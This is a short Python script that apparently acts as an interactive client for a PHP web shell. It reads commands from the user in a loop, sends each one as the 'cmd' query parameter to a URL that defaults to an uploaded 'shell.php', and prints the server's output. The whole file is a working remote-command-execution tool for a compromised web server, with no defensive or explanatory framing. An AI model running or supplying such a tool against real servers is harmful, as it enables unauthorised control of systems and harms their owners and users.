import requests
import argparse

def interact_with_url(base_url, query_param):
    while True:
        cmd = input("Enter command (or 'exit' to quit): ")

        if cmd.lower() == 'exit':
            break
            
        full_url = f"{base_url}?{query_param}={cmd}"

        try:
            # Send a GET request to the URL
            response = requests.get(full_url)

            print("## ")
            print(response.text)
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Interact with a URL via command line.")
    parser.add_argument('--url', type=str, default="http://localhost/uploads/shell.php", help="Base URL to interact with")
    parser.add_argument('--query-param', type=str, default="cmd", help="Query parameter name")
    args = parser.parse_args()

    base_url = args.url
    query_param = args.query_param
    interact_with_url(base_url, query_param)
